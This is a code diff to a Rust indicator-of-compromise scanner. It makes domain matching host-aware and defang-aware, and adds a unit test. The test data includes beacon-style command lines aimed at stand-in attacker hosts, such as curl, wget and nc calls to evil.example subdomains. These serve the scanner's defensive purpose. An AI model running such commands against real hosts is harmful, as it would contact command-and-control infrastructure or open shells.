@@ -210,10 +210,13 @@ impl IocDatabase {
                 }
             }
 
-            // Domains: substring within a token is acceptable (subdomains).
-            let lline = line.to_lowercase();
+            // Domains: match on the PARSED host at label boundaries (equal or a
+            // true subdomain), after defang normalization -- NOT a raw substring.
+            // So `evil.example` matches `https://c2.evil.example/x` and a defanged
+            // `hxxp://evil[.]example`, but NOT `notevil.example` nor a path/string
+            // that merely contains the characters (the substring over-match).
             for (domain, campaign) in &self.domains {
-                if lline.contains(&domain.to_lowercase()) {
+                if crate::neturl::line_has_host(line, domain) {
                     hits.push(IocHit {
                         kind: IocKind::Domain,
                         value: domain.clone(),
@@ -278,5 +281,29 @@ mod tests {
         .unwrap();
         db.merge(extra);
         assert!(db.domains.contains_key("evil.example"));
+    }
+
+    #[test]
+    fn domain_ioc_is_host_aware_not_substring() {
+        // Task 4120: domain IOCs must match on the parsed host (equal or a true
+        // subdomain), after defang normalization -- not a raw substring.
+        let mut db = IocDatabase::embedded();
+        db.domains.insert("evil.example".to_string(), "atomic-arch-2026-06".to_string());
+        let domain_hit = |s: &str| {
+            db.scan_content(s)
+                .iter()
+                .any(|h| h.kind == IocKind::Domain && h.value == "evil.example")
+        };
+
+        // POSITIVE: exact host, a subdomain, and a defanged form all match.
+        assert!(domain_hit("curl https://evil.example/beacon"));
+        assert!(domain_hit("nc c2.evil.example 4444"));
+        assert!(domain_hit("wget hxxps://evil[.]example/x"));
+
+        // NEGATIVE (the substring over-match the old code had):
+        // a sibling label, a path containing the string, and a left-extended host.
+        assert!(!domain_hit("source=(https://github.com/u/evil.example-mirror)"));
+        assert!(!domain_hit("curl https://notevil.example/x"));
+        assert!(!domain_hit("git clone https://evil.example.attacker.net/x"));
     }
 }
